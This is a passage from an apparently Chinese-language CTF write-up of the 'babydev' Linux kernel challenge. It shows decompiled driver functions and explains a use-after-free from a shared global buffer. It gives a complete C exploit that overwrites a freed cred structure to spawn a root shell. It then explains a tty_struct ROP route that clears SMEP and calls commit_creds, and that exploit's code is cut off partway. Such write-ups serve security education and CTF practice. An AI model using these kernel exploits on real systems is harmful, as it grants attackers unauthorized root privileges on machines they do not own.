class="line"><span class="number">12.</span> &#123;</span><br><span class="line"><span class="number">13.</span> kfree(babydev_struct.device_buf);</span><br><span class="line"><span class="number">14.</span> LODWORD(v6) = _kmalloc(v5, <span class="number">0x24000C0</span>LL);</span><br><span class="line"><span class="number">15.</span> babydev_struct.device_buf = v6;</span><br><span class="line"><span class="number">16.</span> babydev_struct.device_buf_len = v5;</span><br><span class="line"><span class="number">17.</span> printk(<span class="string">"alloc donen"</span>, <span class="number">0x24000C0</span>LL, v7);</span><br><span class="line"><span class="number">18.</span> result = <span class="number">0L</span>L;</span><br><span class="line"><span class="number">19.</span> &#125;</span><br><span class="line"><span class="number">20.</span> <span class="keyword">else</span></span><br><span class="line"><span class="number">21.</span> &#123;</span><br><span class="line"><span class="number">22.</span> printk(&amp;default_arg_is_format_str, v4, v4);</span><br><span class="line"><span class="number">23.</span> result = <span class="number">-22L</span>L;</span><br><span class="line"><span class="number">24.</span> &#125;</span><br><span class="line"><span class="number">25.</span> <span class="keyword">return</span> result;</span><br><span class="line"><span class="number">26.</span>&#125;</span><br><span class="line">write函数：</span><br><span class="line"></span><br><span class="line"><span class="number">1.</span> <span class="keyword">ssize_t</span> __<span class="function">fastcall <span class="title">babywrite</span><span class="params">(file *filp, <span class="keyword">const</span> <span class="keyword">char</span> *buffer, <span class="keyword">size_t</span> length, <span class="keyword">loff_t</span> *offset)</span></span></span><br><span class="line">2.  &#123;</span><br><span class="line"><span class="number">3.</span> <span class="keyword">unsigned</span> __int64 copy_len; <span class="comment">// rdx@1</span></span><br><span class="line"><span class="number">4.</span> <span class="keyword">ssize_t</span> result; <span class="comment">// rax@2</span></span><br><span class="line"><span class="number">5.</span> <span class="keyword">ssize_t</span> v6; <span class="comment">// rbx@3</span></span><br><span class="line"><span class="number">6.</span> </span><br><span class="line"><span class="number">7.</span> _fentry__(filp, buffer, length, offset);</span><br><span class="line"><span class="number">8.</span> <span class="keyword">if</span> ( babydev_struct.device_buf )</span><br><span class="line"><span class="number">9.</span> &#123;</span><br><span class="line"><span class="number">10.</span> result = <span class="number">-2L</span>L;</span><br><span class="line"><span class="number">11.</span> <span class="keyword">if</span> ( babydev_struct.device_buf_len &gt; copy_len )</span><br><span class="line"><span class="number">12.</span> &#123;</span><br><span class="line"><span class="number">13.</span> v6 = copy_len;</span><br><span class="line"><span class="number">14.</span> copy_from_user(babydev_struct.device_buf, buffer, copy_len);</span><br><span class="line"><span class="number">15.</span> result = v6;</span><br><span class="line"><span class="number">16.</span> &#125;</span><br><span class="line"><span class="number">17.</span> &#125;</span><br><span class="line"><span class="number">18.</span> <span class="keyword">else</span></span><br><span class="line"><span class="number">19.</span> &#123;</span><br><span class="line"><span class="number">20.</span> result = <span class="number">-1L</span>L;</span><br><span class="line"><span class="number">21.</span> &#125;</span><br><span class="line"><span class="number">22.</span> <span class="keyword">return</span> result;</span><br><span class="line"><span class="number">23.</span>&#125;</span><br></pre></td></tr></table></figure></p>
<p>read函数：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>  <span class="keyword">ssize_t</span> __<span class="function">fastcall <span class="title">babyread</span><span class="params">(file *filp, <span class="keyword">char</span> *buffer, <span class="keyword">size_t</span> length, <span class="keyword">loff_t</span> *offset)</span></span></span><br><span class="line">2.  &#123;</span><br><span class="line"><span class="number">3.</span> <span class="keyword">unsigned</span> __int64 copy_len; <span class="comment">// rdx@1</span></span><br><span class="line"><span class="number">4.</span> <span class="keyword">ssize_t</span> result; <span class="comment">// rax@2</span></span><br><span class="line"><span class="number">5.</span> <span class="keyword">ssize_t</span> v6; <span class="comment">// rbx@3</span></span><br><span class="line"><span class="number">6.</span> </span><br><span class="line"><span class="number">7.</span> _fentry__(filp, buffer, length, offset);</span><br><span class="line"><span class="number">8.</span> <span class="keyword">if</span> ( babydev_struct.device_buf )</span><br><span class="line"><span class="number">9.</span> &#123;</span><br><span class="line"><span class="number">10.</span> result = <span class="number">-2L</span>L;</span><br><span class="line"><span class="number">11.</span> <span class="keyword">if</span> ( babydev_struct.device_buf_len &gt; copy_len )</span><br><span class="line"><span class="number">12.</span> &#123;</span><br><span class="line"><span class="number">13.</span> v6 = copy_len;</span><br><span class="line"><span class="number">14.</span> copy_to_user(buffer, babydev_struct.device_buf, copy_len);</span><br><span class="line"><span class="number">15.</span> result = v6;</span><br><span class="line"><span class="number">16.</span> &#125;</span><br><span class="line"><span class="number">17.</span> &#125;</span><br><span class="line"><span class="number">18.</span> <span class="keyword">else</span></span><br><span class="line"><span class="number">19.</span> &#123;</span><br><span class="line"><span class="number">20.</span> result = <span class="number">-1L</span>L;</span><br><span class="line"><span class="number">21.</span> &#125;</span><br><span class="line"><span class="number">22.</span> <span class="keyword">return</span> result;</span><br><span class="line"><span class="number">23.</span>&#125;</span><br></pre></td></tr></table></figure></p>
<pre><code>open的时候kmalloc了一个大小为64的空间，然后size设置为64，release的时候将会释放这个空间。read和write都会先检查buf指针是不是为NULL，不为NULL再检查大小是否满足要求，之后进行read和write操作，也就是向用户空间写或者读。

ioctl比较特殊，首先判断command是不是为0x10001，如果满足，将会释放之前的buf，新分配一个用户决定大小的空间，并且设置为size。

功能基本上就讲完了，乍一看好像没有漏洞，
那是因为用户空间pwn的思维在限制你使用单线程的思维去考虑。
如果是多线程呢？
我们假设我们打开了两个设备文件，也就是调用了两次open，
第一次分配了，第二次其实将会覆盖第一次分配的buf，因为是全局的。
有了这个思维，剩下的就好想了，如果我们release了第一个，
第二个其实就已经是被释放过的了，这样，就造成了一个UAF了。
</code></pre><h1 id="2-题目思路1-0"><a href="#2-题目思路1-0" class="headerlink" title="2.    题目思路1.0"></a>2.    题目思路1.0</h1><pre><code>通过我们对slub分配器的了解，相同大小的会被放在一块，现在我们来想想，一个进程的权限，是由什么定的？相信你们都知道，uid，uid又保存在哪儿呢？答案是cred结构。cred结构在每一个进程中都有一个，并且保存了该进程的权限信息，如果我们能够修改到cred信息，那么事情就很简单了。
于是思路是，我们有了一个UAF，使某个进程的cred结构体被放进这个UAF的空间，然后我们能够控制这个cred结构体，通过write写入uid，万事大吉！
问题是，如何控制cred结构？别忘了，**相同大小的会被放在一块**，我们首先通过ioctl改变大小，使得和cred结构大小一样，接下来只需要在触发UAF的时候新建一个cred结构，新建的结构就很有可能被放进这个UAF的空间里，创建方法嘛，每一个进程都有，那么，新建一个进程不就好了？新建进程嘛，fork就解决了。
</code></pre><p>好了，只剩下一个问题，大小是多少？</p>
<p>方法一：查看源码。因为配置比较多，效率比较低，还容易错。</p>
<p>方法二：编译一个带符号的内核，直接查看。</p>
<p>方法就很简单了，看看exp吧。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>  <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="number">2.</span>  <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="number">3.</span>  <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="number">4.</span>  <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="number">5.</span>  <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="number">6.</span>  <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="number">7.</span>  <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="number">8.</span>  <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="number">9.</span>  <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="number">10.</span><span class="meta">#<span class="meta-keyword">define</span> CRED_SIZE 168</span></span><br><span class="line"><span class="number">11.</span><span class="meta">#<span class="meta-keyword">define</span> DEV_NAME <span class="meta-string">"/dev/babydev"</span></span></span><br><span class="line"><span class="number">12.</span><span class="keyword">char</span> buf[<span class="number">100</span>];</span><br><span class="line"><span class="number">13.</span><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span></span><br><span class="line">14.&#123;</span><br><span class="line"><span class="number">15.</span> <span class="keyword">int</span> fd1, fd2, ret;</span><br><span class="line"><span class="number">16.</span> <span class="keyword">char</span> zero_buf[<span class="number">100</span>];</span><br><span class="line"><span class="number">17.</span> <span class="built_in">memset</span>(zero_buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(<span class="keyword">char</span>) * <span class="number">100</span>);</span><br><span class="line"><span class="number">18.</span> fd1 = open(DEV_NAME, O_RDWR);</span><br><span class="line"><span class="number">19.</span> fd2 = open(DEV_NAME, O_RDWR);</span><br><span class="line"><span class="number">20.</span> </span><br><span class="line"><span class="number">21.</span> ret = ioctl(fd1, <span class="number">0x10001</span>, CRED_SIZE);</span><br><span class="line"><span class="number">22.</span> </span><br><span class="line"><span class="number">23.</span> close(fd1);</span><br><span class="line"><span class="number">24.</span> </span><br><span class="line"><span class="number">25.</span> <span class="keyword">int</span> now_uid = <span class="number">1000</span>;<span class="comment">//当前uid为1000</span></span><br><span class="line"><span class="number">26.</span> <span class="keyword">int</span> pid = fork();</span><br><span class="line"><span class="number">27.</span> <span class="keyword">if</span> (pid &lt; <span class="number">0</span>)</span><br><span class="line"><span class="number">28.</span> &#123;</span><br><span class="line"><span class="number">29.</span> perror(<span class="string">"fork error"</span>);</span><br><span class="line"><span class="number">30.</span> <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="number">31.</span> &#125;</span><br><span class="line"><span class="number">32.</span> </span><br><span class="line"><span class="number">33.</span> <span class="keyword">if</span> (!pid) </span><br><span class="line"><span class="number">34.</span> &#123;</span><br><span class="line"><span class="number">35.</span> <span class="comment">//写入28个0，一直到egid及其之前的都变为了0，这个时候就已经会被认为是root了。</span></span><br><span class="line"><span class="number">36.</span> ret = write(fd2, zero_buf, <span class="number">28</span>);</span><br><span class="line"><span class="number">37.</span> now_uid = getuid();</span><br><span class="line"><span class="number">38.</span> <span class="keyword">if</span> (!now_uid) </span><br><span class="line"><span class="number">39.</span> &#123;</span><br><span class="line"><span class="number">40.</span> <span class="built_in">printf</span>(<span class="string">"get root donen"</span>);</span><br><span class="line"><span class="number">41.</span> <span class="comment">// 权限修改完毕，启动一个shell，就是root的shell了。</span></span><br><span class="line"><span class="number">42.</span> system(<span class="string">"/bin/sh"</span>);</span><br><span class="line"><span class="number">43.</span> <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line"><span class="number">44.</span> &#125;</span><br><span class="line"><span class="number">45.</span> <span class="keyword">else</span></span><br><span class="line"><span class="number">46.</span> &#123;</span><br><span class="line"><span class="number">47.</span> <span class="built_in">puts</span>(<span class="string">"failed?"</span>);</span><br><span class="line"><span class="number">48.</span> <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line"><span class="number">49.</span> &#125;</span><br><span class="line"><span class="number">50.</span> &#125;</span><br><span class="line"><span class="number">51.</span> <span class="keyword">else</span></span><br><span class="line"><span class="number">52.</span> &#123;</span><br><span class="line"><span class="number">53.</span> wait(<span class="literal">NULL</span>);</span><br><span class="line"><span class="number">54.</span> &#125;</span><br><span class="line"><span class="number">55.</span> close(fd2);</span><br><span class="line"><span class="number">56.</span> <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="number">57.</span>&#125;</span><br></pre></td></tr></table></figure></p>
<h1 id="3-题目思路2-0"><a href="#3-题目思路2-0" class="headerlink" title="3.    题目思路2.0"></a>3.    题目思路2.0</h1><pre><code>好了，第一种方法只是个开胃菜，非常简单非常粗暴，
现在让我们来看看更麻烦的方法，使用tty_struct。关于tty的知识我在这里不想做过多解释，
大家可以自行查找资料。反正tty也是一种设备，
通过&apos;/dev/ptmx&apos;可以打开这个设备，我们要做的，
就是去修改这个设备的函数指针，从而使得对这个设备的操作变为我们所能控制的，
也就是说，我们控制了内核空间的执行流，完美！那么又该干点什么呢？
由于开启了smep，我们不能直接返回用户空间然后以ring0的身份调用函数。
如果可以，那么只需要调用commit_creds(prepare_kernel_cred(NULL))就可以设置为root身份，可惜我们还有更多的工作要做。

既然问题是开启了smep，那么简单，我们反正都控制了执行流，把它关掉就好了。关掉的方法就是通过写入cr4寄存器，将smep位关掉就好了，关掉smep，我们就可以回去执行提权的函数啦。
可是光是控制一次执行流是没办法做这么多工作的，而且我们也没法执行用户空间指定的代码，方法嘛，也是我们常见的方法，ROP。
通过在内核空间进行ROP，执行内核代码，关掉smep，之后回用户空间提权，然后就可以打开shell啦。内核的ROP其实和用户空间ROP相差无几，不过还是有几个细节内容需要考虑，比如，栈在哪儿？没有栈咋ROP呢？没有栈，我们就自己造栈嘛，通过一个gadget，比如xchg eax, esp，注意这里是eax和esp，32位的，就可以做到了。原理就是由于在执行那个ioctl的时候eax正好是要执行的指令的地址，换句话说，就是gadget的地址，而eax截取了低32位，如果是整个64位，rax必然是一个内核空间的地址，可是低32位，就落到用户空间了。
于是我们mmap这个位置，xchg eax, esp，使得esp变为这个值，这样栈就落到了用户空间以内。虽然没法执行代码，但是可以获取数据啊，于是我们就从用户空间获取数据来ret，然后执行内核空间的代码。
</code></pre><p>好了，几个难点如下：</p>
<p>1)    如何获取控制流？通过UAF使得tty_struct覆盖我们释放的位置，我们可以控制tty_struct，然后改写它的操作即可。</p>
<p>2)    如何设定栈？xchg eax, esp。</p>
<p>3)    如何关掉smep？通过ROP调用内核空间的gadget写入关掉smep的新cr4值到cr4寄存器里。</p>
<p>4)    如何获取权限？在关掉smep之后，用户空间调用commit_creds(prepare_kernel_creds(0))即可，这两个函数都是位于内核空间的，可是只要我们知道他们的符号位置，就可以调用内核函数，因为回到用户空间之后，我们的特权还是ring 0的，只是内存位置回来了而已。</p>
<p>5)    如何获取shell？直接system(“/bin/sh”);</p>
<p>6)    实际问题：如何写ROP链？</p>
<p>根据之前的问题，我们需要如下的gadget：</p>
<p>1)    xchg eax, esp来设置栈，用这个gadget覆盖ioctl操作函数嘛。</p>
<p>2)    写入cr4，来关闭smep。</p>
<p>3)    swapgs，回到用户空间之前的准备。</p>
<p>4)    iretq，用来回到用户空间特权级方便打开shell。</p>
<p>5)    commit_creds</p>
<p>6)    prepare_kernel_cred</p>
<p>7)    打开shell。</p>
<p>前四个直接在刚才生成的gadget中去找就可以了，后三个中的4和5，需要内核符号，在/proc/kallsyms文件可以读取到内核所有符号的地址，所以解决了，最后一个打开shell，就是用户空间的地址，好了，解决完毕。</p>
<p>于是任务就简单了，让我们来看看exp：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>  <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="number">2.</span>  <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="number">3.</span>  <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="number">4.</span>  <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="number">5.</span>  <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="number">6.</span>  <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="number">7.</span>  <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="number">8.</span>  <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="number">9.</span>  <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="number">10.</span><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pty.h&gt;</span></span></span><br><span class="line"><span class="number">11.</span><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="number">12.</span><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="number">13.</span><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/sem.h&gt;</span></span></span><br><span class="line"><span class="number">14.</span></span><br><span class="line"><span class="number">15.</span><span class="meta">#<span class="meta-keyword">define</span> TTY_STRUCT_SIZE 0x2e0</span></span><br><span class="line"><span class="number">16.</span><span class="meta">#<span class="meta-keyword">define</span> SPRAY_ALLOC_TIMES 0x100</span></span><br><span class="line"><span class="number">17.</span></span><br><span class="line"><span class="number">18.</span><span class="keyword">int</span> spray_fd[<span class="number">0x100</span>];</span><br><span class="line"><span class="number">19.</span></span><br><span class="line"><span class="number">20.</span><span class="comment">/*</span></span><br><span class="line"><span class="comment">21.</span></span><br><span class="line"><span class="comment">22.tty_struct:</span></span><br><span class="line"><span class="comment">23. int magic; // 4</span></span><br><span class="line"><span class="comment">24. struct kref kref; // 4</span></span><br><span class="line"><span class="comment">25. struct device *dev; // 8</span></span><br><span class="line"><span class="comment">26. struct tty_driver *driver; // 8</span></span><br><span class="line"><span class="comment">27. const struct tty_operations *ops; // 8, offset = 4 + 4 + 8 + 8 = 24</span></span><br><span class="line"><span class="comment">28. [...]</span></span><br><span class="line"><span class="comment">29.</span></span><br><span class="line"><span class="comment">30.*/</span></span><br><span class="line"><span class="number">31.</span></span><br><span class="line"><span class="number">32.</span><span class="class"><span class="keyword">struct</span> <span class="title">tty_operations</span> &#123;</span></span><br><span class="line"><span class="number">33.</span> <span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> * (*<span class="title">lookup</span>)(<span class="title">struct</span> <span class="title">tty_driver</span> *<span class="title">driver</span>,</span></span><br><span class="line"><span class="class">34. <span class="title">struct</span> <span class="title">file</span> *<span class="title">filp</span>, <span class="title">int</span> <span class="title">idx</span>);</span></span><br><span class="line"><span class="number">35.</span> <span class="keyword">int</span> (*install)(struct tty_driver *driver, struct tty_struct *tty);</span><br><span class="line"><span class="number">36.</span> <span class="keyword">void</span> (*remove)(struct tty_driver *driver, struct tty_struct *tty);</span><br><span class="line"><span class="number">37.</span> <span class="keyword">int</span> (*open)(struct tty_struct * tty, struct file * filp);</span><br><span class="line"><span class="number">38.</span> <span class="keyword">void</span> (*close)(struct tty_struct * tty, struct file * filp);</span><br><span class="line"><span class="number">39.</span> <span class="keyword">void</span> (*shutdown)(struct tty_struct *tty);</span><br><span class="line"><span class="number">40.</span> <span class="keyword">void</span> (*cleanup)(struct tty_struct *tty);</span><br><span class="line"><span class="number">41.</span> <span class="keyword">int</span> (*write)(struct tty_struct * tty,</span><br><span class="line"><span class="number">42.</span> <span class="keyword">const</span> <span class="keyword">unsigned</span> <span class="keyword">char</span> *buf, <span class="keyword">int</span> count);</span><br><span class="line"><span class="number">43.</span> <span class="keyword">int</span> (*put_char)(struct tty_struct *tty, <span class="keyword">unsigned</span> <span class="keyword">char</span> ch);</span><br><span class="line"><span class="number">44.</span> <span class="keyword">void</span> (*flush_chars)(struct tty_struct *tty);</span><br><span class="line"><span class="number">45.</span> <span class="keyword">int</span> (*write_room)(struct tty_struct *tty);</span><br><span class="line"><span class="number">46.</span> <span class="keyword">int</span> (*chars_in_buffer)(struct tty_struct *tty);</span><br><span class="line"><span class="number">47.</span> <span class="keyword">int</span> (*ioctl)(struct tty_struct *tty,</span><br><span class="line"><span class="number">48.</span> <span class="keyword">unsigned</span> <span class="keyword">int</span> cmd, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg);</span><br><span class="line"><span class="number">49.</span> <span class="keyword">long</span> (*compat_ioctl)(struct tty_struct *tty,</span><br><span class="line"><span class="number">50.</span> <span class="keyword">unsigned</span> <span class="keyword">int</span> cmd, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg);</span><br><span class="line"><span class="number">51.</span> <span class="keyword">void</span> (*set_termios)(struct tty_struct *tty, struct ktermios * old);</span><br><span class="line"><span class="number">52.</span> <span class="keyword">void</span> (*throttle)(struct tty_struct * tty);</span><br><span class="line"><span class="number">53.</span> <span class="keyword">void</span> (*unthrottle)(struct tty_struct * tty);</span><br><span class="line"><span class="number">54.</span> <span class="keyword">void</span> (*stop)(struct tty_struct *tty);</span><br><span class="line"><span class="number">55.</span> <span class="keyword">void</span> (*start)(struct tty_struct *tty);</span><br><span class="line"><span class="number">56.</span> <span class="keyword">void</span> (*hangup)(struct tty_struct *tty);</span><br><span class="line"><span class="number">57.</span> <span class="keyword">int</span> (*break_ctl)(struct tty_struct *tty, <span class="keyword">int</span> state);</span><br><span class="line"><span class="number">58.</span> <span class="keyword">void</span> (*flush_buffer)(struct tty_struct *tty);</span><br><span class="line"><span class="number">59.</span> <span class="keyword">void</span> (*set_ldisc)(struct tty_struct *tty);</span><br><span class="line"><span class="number">60.</span> <span class="keyword">void</span> (*wait_until_sent)(struct tty_struct *tty, <span class="keyword">int</span> timeout);</span><br><span class="line"><span class="number">61.</span> <span class="keyword">void</span> (*send_xchar)(struct tty_struct *tty, <span class="keyword">char</span> ch);</span><br><span class="line"><span class="number">62.</span> <span class="keyword">int</span> (*tiocmget)(struct tty_struct *tty);</span><br><span class="line"><span class="number">63.</span> <span class="keyword">int</span> (*tiocmset)(struct tty_struct *tty,</span><br><span class="line"><span class="number">64.</span> <span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="built_in">set</span>, <span class="keyword">unsigned</span> <span class="keyword">int</span> clear);</span><br><span class="line"><span class="number">65.</span> <span class="keyword">int</span> (*resize)(struct tty_struct *tty, struct winsize *ws);</span><br><span class="line"><span class="number">66.</span> <span class="keyword">int</span> (*set_termiox)(struct tty_struct *tty, struct termiox *tnew);</span><br><span class="line"><span class="number">67.</span> <span class="keyword">int</span> (*get_icount)(struct tty_struct *tty,</span><br><span class="line"><span class="number">68.</span> struct serial_icounter_struct *icount);</span><br><span class="line"><span class="number">69.</span> <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> *<span class="title">proc_fops</span>;</span></span><br><span class="line"><span class="number">70.</span>&#125;;</span><br><span class="line"><span class="number">71.</span></span><br><span class="line"><span class="number">72.</span><span class="keyword">typedef</span> <span class="keyword">int</span> __attribute__((regparm(<span class="number">3</span>)))(*commit_creds_func)(<span class="keyword">unsigned</span> <span class="keyword">long</span> cred);</span><br><span class="line"><span class="number">73.</span><span class="keyword">typedef</span> <span class="keyword">unsigned</span> <span class="keyword">long</span> __attribute__((regparm(<span class="number">3</span>))) (*prepare_kernel_cred_func)(<span class="keyword">unsigned</span> <span class="keyword">long</span> cred);</span><br><span class="line"><span class="number">74.</span></span><br><span class="line"><span class="number">75.</span><span class="comment">/* Gadgets */</span></span><br><span class="line"><span class="number">76.</span>commit_creds_func commit_creds = (commit_creds_func) <span class="number">0xffffffff810a1420</span>;</span><br><span class="line"><span class="number">77.</span>prepare_kernel_cred_func prepare_kernel_cred = (prepare_kernel_cred_func) <span class="number">0xffffffff810a1810</span>;</span><br><span class="line"><span 